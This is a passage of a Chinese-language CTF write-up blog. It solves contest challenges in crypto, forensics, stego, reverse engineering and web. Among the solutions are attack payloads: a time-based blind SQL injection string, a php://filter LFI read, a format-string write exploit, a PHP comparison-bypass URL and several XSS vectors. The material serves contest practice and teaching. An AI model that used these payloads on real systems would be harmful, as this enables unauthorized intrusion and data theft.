= open(<span class="hljs-string">&#x27;enc1&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br>message = rsa<span class="hljs-selector-class">.decrypt</span>(crypto, privkey)<br>print message<br></code></pre></td></tr></table></figure><p>命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> rsautl -decrypt -in enc<span class="hljs-number">1</span> -inkey <span class="hljs-number">6</span>.key -out flag.txt <br></code></pre></td></tr></table></figure><h3 id="0x02-RSA2"><a href="#0x02-RSA2" class="headerlink" title="0x02 RSA2"></a>0x02 RSA2</h3><p>给了两个n,而且e都一样，可以利用欧几里得算法求它们两个的最大公约数</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">def gcd(<span class="hljs-keyword">a</span>, b):<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">a</span> &lt; b):<br><span class="hljs-keyword">a</span>, b = b, <span class="hljs-keyword">a</span><br><span class="hljs-keyword">while</span> b != <span class="hljs-number">0</span>:<br>temp = <span class="hljs-keyword">a</span> % b<br><span class="hljs-keyword">a</span> = b<br>b = temp<br><span class="hljs-literal">return</span> <span class="hljs-keyword">a</span><br></code></pre></td></tr></table></figure><p>分解后获得p,然后利用n=p*q获得q。</p><p>已知了p、q、e,使用工具生成私钥，将给的数据利用python的m.decode(‘hex’)或者winhex写入到文件，然后解密即可，方法同RSA1</p><h3 id="0x03-仿射加密"><a href="#0x03-仿射加密" class="headerlink" title="0x03 仿射加密"></a>0x03 仿射加密</h3><p>题目描述<br>​<br>​    已知仿射加密变换为c=（11m+7）mod26，试对密文dikxourxd解密</p><p>解密python脚本</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#coding:utf-8</span><br>m = <span class="hljs-string">&#x27;dikxourxd&#x27;</span><br>strs = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> c in m:<br><span class="hljs-keyword">for</span> i in strs:<br><span class="hljs-keyword">if</span> ((<span class="hljs-number">11</span>*(<span class="hljs-keyword">ord</span>(i)-<span class="hljs-number">97</span>)+<span class="hljs-number">7</span>)%26) == (<span class="hljs-keyword">ord</span>(c)-<span class="hljs-number">97</span>):<br>flag += i<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">print</span>(flag)<br></code></pre></td></tr></table></figure><h3 id="0x04-小明的密码"><a href="#0x04-小明的密码" class="headerlink" title="0x04 小明的密码"></a>0x04 小明的密码</h3><pre><code>97年出生的小明用自己的生日作为自己网站的密码，现在，得到一串被篡改过一个字符的字符串，你能解出小明的生日吗？0175501585710a89h5a60dc9ed2f88d7</code></pre><p>根据MD5的生成原理，可以发现被篡改的字符为中间的”h”，是小明的生日，那么为6位或者8位数字，脚本爆破即可</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> hashlib<br><span class="hljs-attribute">for</span> m in range(<span class="hljs-number">1</span>,<span class="hljs-number">13</span>):<br><span class="hljs-attribute">for</span> d in range(<span class="hljs-number">1</span>,<span class="hljs-number">33</span>):<br><span class="hljs-attribute">t</span> = &#x27;<span class="hljs-number">1997</span>&#x27;+str(m).zfill(<span class="hljs-number">2</span>)+str(d).zfill(<span class="hljs-number">2</span>)<br><span class="hljs-attribute">md5</span> = hashlib.md<span class="hljs-number">5</span>(t).hexdigest()<br><span class="hljs-attribute">if</span> md<span class="hljs-number">5</span>[:<span class="hljs-number">16</span>] == &#x27;<span class="hljs-number">0175501585710</span>a<span class="hljs-number">89</span>&#x27;:<br><span class="hljs-attribute">print</span> t<br></code></pre></td></tr></table></figure><h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="0x01-Web漏洞"><a href="#0x01-Web漏洞" class="headerlink" title="0x01 Web漏洞"></a>0x01 Web漏洞</h3><p>使用Apache Logs Viewer打开给的日志文件进行分析，发现进行了一个SQL盲注的过程</p><p><img src="https://image.mengsec.com/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%9C%81%E8%B5%9B%E5%86%B3%E8%B5%9B_Web%E6%BC%8F%E6%B4%9E_1.png"></p><p>可以将整个注入过程的日志进行url解码后手工分析，可以发现在<br>​<br>​    26/Oct/2017:05:39:41<br>开始通过盲注来获得dvwa.flag的数据<br>比如<br>​<br>​    ?id=123’ AND (SELECT * FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM dvwa.flag),1,1))!=49,0,5)))))sbAQ)<br>通过该语句可判断flag第一个字符的ASCII值为49，类比着向下分析即可，最后将获得的所有ASCII转为字符拼接起来即可获得flag</p><pre><code>102 108 97 103 123 51 50 56 55 102 101 51 48 48 102 50 56 101 50 52 97 101 102 97 50 100 56 54 56 56 51 56 51 50 99 57 102 125</code></pre><p>也可以使用python脚本进行分析</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import re<br>f = open(<span class="hljs-string">&quot;access.log&quot;</span>)<br>sqli = <span class="hljs-selector-attr">[]</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> f:<br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;FROM dvwa.flag ORDER BY flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-selector-tag">i</span>:<br>sqli<span class="hljs-selector-class">.append</span>(i)<br>f<span class="hljs-selector-class">.close</span>()<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> range(len(sqli)):<br>char = re<span class="hljs-selector-class">.findall</span>(<span class="hljs-string">&#x27;\)\)!=(\d+),0,1\)\)&#x27;</span>, sqli<span class="hljs-selector-attr">[i]</span>)<br><span class="hljs-keyword">if</span> char:<br>flag += chr(int(char<span class="hljs-selector-attr">[0]</span>))<br>print flag<br></code></pre></td></tr></table></figure><h3 id="0x02-磁盘镜像、"><a href="#0x02-磁盘镜像、" class="headerlink" title="0x02 磁盘镜像、"></a>0x02 磁盘镜像、</h3><p>在linux中直接挂载镜像即可<br><img src="https://image.mengsec.com/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%9C%81%E8%B5%9B%E5%86%B3%E8%B5%9B_%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F_1.png"></p><p>也可以用命令，Mac本可以直接打开 = = </p><h3 id="0x03-黑客的机密信息"><a href="#0x03-黑客的机密信息" class="headerlink" title="0x03 黑客的机密信息"></a>0x03 黑客的机密信息</h3><p>找的Webshell的流量，可以知道是用菜刀进行的管理，由于菜刀的命令是使用base64进行传输的，直接搜索字符串”flag”的base64值”ZmxhZw==”</p><pre><code>http contains &quot;ZmxhZ3&quot;</code></pre><p><img src="https://image.mengsec.com/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%9C%81%E8%B5%9B%E5%86%B3%E8%B5%9B_%E9%BB%91%E5%AE%A2%E7%9A%84%E6%9C%BA%E5%AF%86%E4%BF%A1%E6%81%AF_1.png"></p><p>将找到的命令进行解码即可获得flag</p><h3 id="0x04-远控木马"><a href="#0x04-远控木马" class="headerlink" title="0x04 远控木马"></a>0x04 远控木马</h3><p>这题要的是木马的控制端的IP以及端口号，木马运行后肯定会向控制端发送信息，将木马运行后使用Wireshark抓包即可</p><p>最后可获得flag</p><pre><code>flag&#123;192.168.233.222:9099&#125;</code></pre><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="0x01-base家族"><a href="#0x01-base家族" class="headerlink" title="0x01 base家族"></a>0x01 base家族</h3><p>base混合加密呗，直接上脚本爆破</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vim">import base64<br><span class="hljs-keyword">file</span> = <span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;base.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br><span class="hljs-keyword">st</span> = <span class="hljs-keyword">file</span>.<span class="hljs-keyword">read</span>()<br><span class="hljs-keyword">while</span> True:<br><span class="hljs-keyword">try</span>:<br><span class="hljs-keyword">st</span> = base64.b16decode(<span class="hljs-keyword">st</span>)<br>excep<span class="hljs-variable">t:</span><br><span class="hljs-keyword">try</span>:<br><span class="hljs-keyword">st</span> = base64.b32decode(<span class="hljs-keyword">st</span>)<br>excep<span class="hljs-variable">t:</span><br><span class="hljs-keyword">st</span> = base64.b64decode(<span class="hljs-keyword">st</span>)<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">st</span>.<span class="hljs-keyword">find</span>(<span class="hljs-string">&#x27;flag&#x27;</span>) == <span class="hljs-number">0</span>):<br><span class="hljs-keyword">print</span>(<span class="hljs-keyword">st</span>)<br></code></pre></td></tr></table></figure><h3 id="0x02-人生苦短"><a href="#0x02-人生苦短" class="headerlink" title="0x02 人生苦短"></a>0x02 人生苦短</h3><p>使用Wireshark提取数据包里的文件</p><pre><code>文件-导出对象-HTTP</code></pre><p>发现存在flagaa,flagab,flagac,flagad,flagae,flagaf文件</p><p><img src="https://image.mengsec.com/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%9C%81%E8%B5%9B%E5%86%B3%E8%B5%9B_%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD_1.png"></p><p>提取出来使用Winhex打开，发现flagaa的文件头是PK,猜测是被分割的压缩包，使用Winhex的文件合并工具，将其合并</p><p><img src="https://image.mengsec.com/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%9C%81%E8%B5%9B%E5%86%B3%E8%B5%9B_%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD_2.jpg"></p><p>然后解伪加密即可获得flag</p><h3 id="0x03-神奇的图片"><a href="#0x03-神奇的图片" class="headerlink" title="0x03 神奇的图片"></a>0x03 神奇的图片</h3><p>根据图片名称”xor”,可知是异或，写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br>enc = f.read()<br>f.close()<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;xor.png&#x27;</span>)<br>xor = f.read()<br>f.close()<br>s = <span class="hljs-string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\&#x27;&quot;_%&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(xor[i]) ^ <span class="hljs-built_in">ord</span>(c) == <span class="hljs-built_in">ord</span>(enc[i]):<br>flag += c<br><span class="hljs-built_in">print</span> flag<br></code></pre></td></tr></table></figure><h3 id="0x04-颜文字"><a href="#0x04-颜文字" class="headerlink" title="0x04 颜文字"></a>0x04 颜文字</h3><p>直接拖到文件最后，找的那串颜文字，扔到浏览器的控制台里运行一下即可获得flag</p><h2 id="Stego"><a href="#Stego" class="headerlink" title="Stego"></a>Stego</h2><h3 id="0x01-gakki"><a href="#0x01-gakki" class="headerlink" title="0x01 gakki"></a>0x01 gakki</h3><p>隐藏了图片的下半部分，使用UE或者Winhex修改图片头中长宽的大小即可。</p><p>如图，将所示位置的03 1E改为06 1E即可</p><p><img src="https://image.mengsec.com/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%9C%81%E8%B5%9B%E5%86%B3%E8%B5%9B_gakki_1.png"></p><h3 id="0x02-hacker"><a href="#0x02-hacker" class="headerlink" title="0x02 hacker"></a>0x02 hacker</h3><p>使用Stegsolve打开图片，在Blue plane 0时获得一个二维码，扫描一下即可获得flag</p><h3 id="0x03-神奇的二维码"><a href="#0x03-神奇的二维码" class="headerlink" title="0x03 神奇的二维码"></a>0x03 神奇的二维码</h3><p>直接打开flag.txt，给了一堆坐标，很明显是图片像素的RGB值，使用脚本将图片画出来,将文件拉到末尾可知有78400个点，开根号后为280，即图片的边长。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-attribute">from</span> PIL import Image<br><span class="hljs-attribute">MAX</span> = <span class="hljs-number">280</span><br><span class="hljs-attribute">pic</span> = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX, MAX))<br><span class="hljs-attribute">file</span> = open(<span class="hljs-string">&quot;flag.txt&quot;</span>,&#x27;r&#x27;)<br><span class="hljs-attribute">m</span> = file.read().split(&#x27;\n&#x27;)<br><span class="hljs-attribute">i</span>=<span class="hljs-number">0</span><br><span class="hljs-attribute">for</span> y in range (<span class="hljs-number">0</span>,MAX):<br>    <span class="hljs-attribute">for</span> x in range (<span class="hljs-number">0</span>,MAX):<br>        <span class="hljs-attribute">if</span>(m[i] == &#x27;(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)&#x27;):<br>            <span class="hljs-attribute">pic</span>.putpixel([x,y],(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>        <span class="hljs-attribute">else</span>:<br>            <span class="hljs-attribute">pic</span>.putpixel([x,y],(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>        <span class="hljs-attribute">i</span> = i+<span class="hljs-number">1</span><br><span class="hljs-attribute">pic</span>.show()<br><span class="hljs-attribute">pic</span>.save(<span class="hljs-string">&quot;flag.png&quot;</span>)<br></code></pre></td></tr></table></figure><p>扫一下二维码获得一个字符串<br>​<br>​    ONYXE6LSIVXF6ZTUOZTXWRRRIRPWCZLWORIGCLJQG56Q====</p><p>base32解码</p><pre><code>sqryrEn_ftvg&#123;F1D_aevtPa-07&#125;</code></pre><p>看格式应该是有栅栏加密，使用工具</p><p><img src="https://image.mengsec.com/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%9C%81%E8%B5%9B%E5%86%B3%E8%B5%9B_%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81_1.png"></p><p>根据flag的格式为flag{},猜测第三栏是正确的，然后进行凯撒解密</p><pre><code>第3栏synt&#123;DeP0qr_vF_va7rEfg1at-&#125;</code></pre><p>脚本如下</p><pre><code>message = &#39;synt&#123;DeP0qr_vF_va7rEfg1at-&#125;&#39;LETTERS = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;letters = &#39;abcdefghijklmnopqrstuvwxyz&#39;for key in range(len(LETTERS)):    tran = &#39;&#39;    for i in message:        if i in LETTERS:            num = LETTERS.find(i)            num = num - key            if num &lt; 0:                num = num + len(LETTERS)            tran = tran + LETTERS[num]        elif i in letters:            num = letters.find(i)            num = num - key            if num &lt; 0:                num = num + len(letters)            tran = tran + letters[num]        else:            tran = tran + i    print(&#39;key = %s: %s&#39; % (key, tran))</code></pre><p>flag为</p><pre><code>key = 13: flag&#123;QrC0de_iS_in7eRst1ng-&#125;</code></pre><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="0x01-时光机"><a href="#0x01-时光机" class="headerlink" title="0x01 时光机"></a>0x01 时光机</h3><p>很容易就可以找到关键代码</p><p><img src="https://image.mengsec.com/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%9C%81%E8%B5%9B%E5%86%B3%E8%B5%9B_Re_1.png"></p><p>只有当程序运行200000秒后才会出flag..<br>我们可以看到flag只与k有关。</p><p>从200000到0的每一秒都进入is2函数，如果为true, k+=100,否则k–<br>当beg与now相等时，k在stringFromJNI2函数中经过一系列计算后返回flag<br>但是看stringFromJNI2函数时发现特别麻烦…<br>所以我们的思路为:</p><ol><li>   写代码实现k的计算过程,求出k。</li><li>   在mainactivity中将k的计算过程删去，直接赋值我们求出来的k。</li><li>   更改程序的流程，直接出flag。</li></ol><p>求k的脚本如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">k</span>=<span class="hljs-number">0</span><br><span class="hljs-attribute">flag</span>=<span class="hljs-number">0</span><br><span class="hljs-attribute">for</span> i in xrange(<span class="hljs-number">200000</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>):<br>   <span class="hljs-attribute">flag</span>=<span class="hljs-number">0</span><br>   <span class="hljs-attribute">if</span> i&gt;<span class="hljs-number">3</span>:<br>       <span class="hljs-attribute">if</span> i%<span class="hljs-number">2</span>!=<span class="hljs-number">0</span> and i %<span class="hljs-number">3</span>!=<span class="hljs-number">0</span>:<br>           <span class="hljs-attribute">v0</span>=<span class="hljs-number">5</span><br><span class="hljs-attribute">while</span> <span class="hljs-number">1</span>:           <br>              <span class="hljs-attribute">if</span> v<span class="hljs-number">0</span>*v<span class="hljs-number">0</span>&lt;=i:<br>                  <span class="hljs-attribute">if</span> i%v<span class="hljs-number">0</span>!=<span class="hljs-number">0</span> and i%(v<span class="hljs-number">0</span>+<span class="hljs-number">2</span>)!=<span class="hljs-number">0</span>:<br>                      <span class="hljs-attribute">v0</span>+=<span class="hljs-number">6</span><br>                  <span class="hljs-attribute">else</span>:<br>                      <span class="hljs-attribute">k</span>-=<span class="hljs-number">1</span><br>                      <span class="hljs-attribute">break</span><br>              <span class="hljs-attribute">else</span>:<br>                  <span class="hljs-attribute">k</span>+=<span class="hljs-number">100</span><br>                  <span class="hljs-attribute">flag</span>=<span class="hljs-number">1</span><br>                  <span class="hljs-attribute">break</span><br>      <span class="hljs-attribute">else</span>:<br>      <br>          <span class="hljs-attribute">k</span>-=<span class="hljs-number">1</span><br>  <span class="hljs-attribute">elif</span> i==<span class="hljs-number">1</span>:<br>      <span class="hljs-attribute">k</span>-=<span class="hljs-number">1</span><br>  <span class="hljs-attribute">else</span>:<br>      <span class="hljs-attribute">k</span>+=<span class="hljs-number">100</span><br>     <br>  <span class="hljs-attribute">print</span> k<br></code></pre></td></tr></table></figure><p>直接赋值k的smali语句</p><p><img src="https://image.mengsec.com/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%9C%81%E8%B5%9B%E5%86%B3%E8%B5%9B_Re_2.png"></p><h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><h3 id="0x01-黄铜2-LFI-Web"><a href="#0x01-黄铜2-LFI-Web" class="headerlink" title="0x01 黄铜2 LFI(Web)"></a>0x01 黄铜2 LFI(Web)</h3><p>测试poj=index<br>无限循环包含index.php，可判断后台会自动拼接.php</p><p>于是<br>​<br>​    ?poj=php://filter/read=convert.base64-encode/resource=index</p><p>可用来读取源码</p><p>然后利用phar伪协议或zip伪协议包含上传的文件，可拿到权限</p><h3 id="0x02-白银1-yes-you-see-it-Web"><a href="#0x02-白银1-yes-you-see-it-Web" class="headerlink" title="0x02 白银1 yes you see it (Web)"></a>0x02 白银1 yes you see it (Web)</h3><p>source.tar.gz 源码泄露<br>反序列化 对象注⼊</p><pre><code>flag&#123;9kWIS4kcx066vD7p&#125;</code></pre><h3 id="0x03-Pwn1"><a href="#0x03-Pwn1" class="headerlink" title="0x03 Pwn1"></a>0x03 Pwn1</h3><p>可以看到为格式化字符串漏洞，通过格式化字符串实现任意地址写从而更改key的值</p><p><img src="https://image.mengsec.com/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%9C%81%E8%B5%9B%E5%86%B3%E8%B5%9B_Pwn_1.png"></p><p>我们先用%x来查找字符串的偏移值（偏移值既字符串在栈中的位置距调用printf函数时当前栈的距离，可以通过gdb直接查看）</p><p><img src="https://image.mengsec.com/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%9C%81%E8%B5%9B%E5%86%B3%E8%B5%9B_Pwn_2.png"></p><p>可以看到当输入为12个%x时，正好输出aaaa，所以偏移值为12</p><p>下面我们构造格式化字符串<br>可以通过使用%nx(n为任意长度的十进制数字)来控制字符串长度，字符串长度为len(address)+n,通过将长度写入到偏移地址中来进行对任意地址进行任意读写。<br>注意$n是更改两位，$hn更改四位</p><p><img src="https://image.mengsec.com/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%9C%81%E8%B5%9B%E5%86%B3%E8%B5%9B_Pwn_3.png"></p><p>如上我们就更改了最右边的两位为0x22<br>同理，构造本题的exp为</p><pre><code>\x30\xa0\x04\x08\x31\xa0\x04\x08\x32\xa0\x04\x08%22x%12\$n%17x%13\$n%495x%14\$hn</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>合天Web进阶部分题目Writeup</title>
    <link href="/2017/10/10/%E5%90%88%E5%A4%A9Web%E8%BF%9B%E9%98%B6%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/"/>
    <url>/2017/10/10/%E5%90%88%E5%A4%A9Web%E8%BF%9B%E9%98%B6%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/</url>
    
    <content type="html"><![CDATA[<p>持续更新中。。</p><a id="more"></a><h2 id="捉迷藏"><a href="#捉迷藏" class="headerlink" title="捉迷藏"></a>捉迷藏</h2><p><a href="http://218.76.35.75:20111/" title="题目地址">题目地址</a></p><p>右键查看源代码：</p><pre><code>&lt;p&gt;&lt;a href=&quot;Index.php&quot;&gt;&lt;font color=&quot;black&quot;&gt;index&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;</code></pre><p>点击Index.php跳转,获得flag</p><pre><code>A HIDDEN FLAG: FLAG&#123;th!5!5n0tth3fl@g&#125;</code></pre><p>这题略坑啊，还有假flag。。意义何在呢。(╯‵□′)╯︵┻━┻</p><h2 id="简单问答"><a href="#简单问答" class="headerlink" title="简单问答"></a>简单问答</h2><p><a href="http://218.76.35.75:20112/" title="题目地址">题目地址</a></p><p>右键查看源代码后，将disable删掉，选好正确答案提交，并不对，抓一下包。发现答案被改了，而且还有个success=false,直接改成true，再次提交。</p><pre><code>q1=2016&amp;q2=lol&amp;q4=22&amp;success=true</code></pre><p>还是Fail,看代码里提交的参数是q1,q2,q4啊..</p><p>试了试提交q3..flag出来了。这题坑吧。。。还是我忽略了啥。<br>    payload:</p><pre><code>Post：q1=2016&amp;q2=lol&amp;q3=22&amp;success=true</code></pre><p>flag为：</p><pre><code>flag&#123;W3ll_d0n3&#125;</code></pre><h2 id="后台后台后台"><a href="#后台后台后台" class="headerlink" title="后台后台后台"></a>后台后台后台</h2><p><a href="http://218.76.35.75:20113/" title="题目地址">题目地址</a></p><p>进入后直接Enter下，给了个提示</p><pre><code>Only Member with Admin rights is allow to enter </code></pre><p>然后抓了下包，发现cookie中有Member这个参数</p><pre><code>Cookie: User=JohnTan101; Member=Tm9ybWFs;</code></pre><p>解码得</p><pre><code>Tm9ybWFs --&gt; Normal</code></pre><p>根据提示，修改Member的值为QWRtaW4=(base64–Admin)<br>获得flag</p><pre><code>flag&#123;C00ki3_n0m_n0m_n0m&#125;</code></pre><h2 id="php是最好的语言"><a href="#php是最好的语言" class="headerlink" title="php是最好的语言"></a>php是最好的语言</h2><p><a href="http://218.76.35.75:20114/index.php" title="题目地址">题目地址</a></p><p>打开后有源代码</p><pre><code>&lt;?phpshow_source(__FILE__);$v1=0;$v2=0;$v3=0;$a=(array)json_decode(@$_GET[&#39;foo&#39;]);if(is_array($a))&#123;    is_numeric(@$a[&quot;bar1&quot;])?die(&quot;nope&quot;):NULL;    if(@$a[&quot;bar1&quot;])&#123;        ($a[&quot;bar1&quot;]&gt;2016)?$v1=1:NULL;    &#125;    if(is_array(@$a[&quot;bar2&quot;]))&#123;        if(count($a[&quot;bar2&quot;])!==5 OR !is_array($a[&quot;bar2&quot;]    [0])) die(&quot;nope&quot;);        $pos = array_search(&quot;nudt&quot;, $a[&quot;a2&quot;]);        $pos===false?die(&quot;nope&quot;):NULL;        foreach($a[&quot;bar2&quot;] as $key=&gt;$val)&#123;            $val===&quot;nudt&quot;?die(&quot;nope&quot;):NULL;        &#125;        $v2=1;    &#125;&#125;$c=@$_GET[&#39;cat&#39;];$d=@$_GET[&#39;dog&#39;];if(@$c[1])&#123;    if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d)&#123;        eregi(&quot;3|1|c&quot;,$d.$c[0])?die(&quot;nope&quot;):NULL;        strpos(($c[0].$d), &quot;htctf2016&quot;)?$v3=1:NULL;    &#125;&#125;if($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123;    include &quot;flag.php&quot;;    echo $flag;&#125;?&gt;</code></pre><p>分析：</p><pre><code>foo中有bar1，bar2，a2bar1的值不是数字且大于2016bar2是数组，其中的元素数为5，并且bar2的第一个元素是数组，bar2中有nudta2为nudtcat[1]为一个数组dog和cat[0]中没有，3，1，c，可用00截断cat[0].dog中存在htctf2016</code></pre><p>构造Payload</p><pre><code>http://218.76.35.75:20114/index.php?foo=&#123;&quot;bar1&quot;:&quot;9999a&quot;,&quot;bar2&quot;:[[1],1,2,3,0],&quot;a2&quot;:[&quot;nudt&quot;,1,2,3,0]&#125;&amp;cat[0]=%00htctf2016&amp;cat[1][]=2333&amp;d=233</code></pre><p>flag为：</p><pre><code>flag&#123;php_i5_n0t_b4d&#125;</code></pre><p>JS加解密</p><p>HTML语言很松散，哪怕有标签没闭合，JS代码也可以执行</p><p>payload:</p><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;&lt;img src=1 onerror=alert(&#39;123&#39;)&gt;&lt;svg/onload=alert(1)&gt;&lt;iframe src=javascript:alert(1)&gt;</code></pre><h2 id="Reappear"><a href="#Reappear" class="headerlink" title="Reappear"></a>Reappear</h2><p><a href="http://218.76.35.75:65180/" title="题目地址">题目地址</a></p><p>题目描述说</p><pre><code>描述：网管说他安装了什么编辑器，但是似乎不太会用。。。</code></pre><p>打开链接：</p><pre><code>Kindeditor v4.1.7something maybe in /kindeditor/</code></pre><p>直接访问</p><pre><code>http://218.76.35.75:65180/kindeditor/</code></pre><p>直接列目录了，挨个打开看了看，要不提示</p><pre><code>I don&#39;t think it will work</code></pre><p>要不就提示</p><pre><code>You are 